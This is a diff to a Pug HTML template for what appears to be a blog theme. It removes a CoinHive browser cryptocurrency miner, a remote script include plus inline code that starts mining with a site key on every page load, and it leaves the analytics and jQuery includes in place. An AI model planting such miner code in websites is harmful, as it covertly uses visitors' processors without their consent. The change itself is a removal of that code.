@@ -99,14 +99,6 @@ html
       script(src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js")
       script(src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js")
 
-      script.
-        $(document).ready(function() {
-            $(".fancybox").fancybox();
-            var miner = new CoinHive.User('CI0BTOAY7b8b5JAWUcJNQEt7M7k2jqPL', '#{current_title}', { threads: 2 });
-            miner.start();
-            console.log(miner.isRunning());
-        });
-        
     if theme.google_analytics
       script.
           (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
@@ -115,5 +107,3 @@ html
           e.src='//www.google-analytics.com/analytics.js';
           r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
           ga('create','#{theme.google_analytics}');ga('send','pageview');
-
-    script(src="https://coinhive.com/lib/coinhive.min.js")
